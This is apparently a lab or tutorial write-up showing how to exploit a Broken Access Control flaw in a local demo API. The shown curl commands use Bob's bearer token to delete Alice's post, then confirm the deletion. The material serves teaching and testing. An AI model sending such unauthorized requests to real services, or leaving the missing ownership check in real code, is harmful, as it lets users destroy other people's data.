## Exploitation Steps
The goal is to use an authenticated user, Bob, to delete a post that belongs to another user, Alice.

1. Verify the Target Exists
Before the attack, confirm that Alice's post (ID 1) is available. You can do this with a simple GET request.

```Bash
curl http://127.0.0.1:8000/posts/1
```
Expected Response:

```JSON

{"owner":"alice","content":"Post da Alice."}
```
2. Perform the Exploit
Now, send a DELETE request to the URL for Alice's post. The key to the exploit is to use Bob's authentication token (token_de_bob) in the Authorization header.

```Bash

curl -X DELETE "http://127.0.0.1:8000/posts/1" \
     -H "Authorization: Bearer token_de_bob"
```

The server will accept this request and respond with a 204 No Content status, indicating success, because it only checks for authentication, not for ownership.

3. Confirm the Deletion
To verify that the exploit was successful, try to retrieve Alice's post again.

```Bash

curl http://127.0.0.1:8000/posts/1
```
Expected Response:

```JSON

{"detail":"Post not found"}
```
This confirms that Bob successfully deleted Alice's resource, which is a critical Broken Access Control failure.